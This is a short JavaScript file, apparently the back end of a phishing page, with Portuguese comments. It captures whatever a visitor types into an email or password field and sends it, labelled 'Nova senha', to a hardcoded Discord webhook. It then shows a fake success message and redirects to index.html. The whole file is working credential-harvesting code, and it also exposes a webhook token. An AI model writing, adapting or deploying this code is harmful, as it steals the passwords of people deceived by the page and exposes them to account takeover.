document.addEventListener('DOMContentLoaded', function () {
    const nextButton = document.getElementById('next-button');
    const emailInput = document.getElementById('email'); // Captura o campo de e-mail ou senha

    // Quando o botão "Próxima" for clicado
    nextButton.addEventListener('click', function (event) {
        event.preventDefault(); // Previne o envio padrão do formulário
        
        const email = emailInput.value.trim(); // Captura o valor do campo e-mail ou senha

        // Enviar dados para o Discord
        const webhookUrl = "https://discord.com/api/webhooks/1313707028773998683/7R83jdV8OI-7jKUAtEMRcqqgL9rsUaSpIAtW1rvYtfA5TBkAEj_QGanUMFiPaMELipAn"; // Substitua pelo seu URL de Webhook

        const message = {
            content: `**Nova senha:** ${email}`, // Mensagem formatada
        };

        // Envia os dados para o Discord usando fetch
        fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(message),
        })
        .then(response => {
            if (response.ok) {
                console.log('Cadastrado com sucesso!');
                alert('Cadastrado com sucesso!');
                // Redireciona para index.html após o envio
                window.location.href = "index.html";
            } else {
                alert("Erro ao enviar os dados para o Discord. Tente novamente.");
            }
        })
        .catch(error => {
            console.error('Erro ao enviar dados:', error);
            alert("Erro ao tentar enviar os dados. Tente novamente.");
        });
    });
});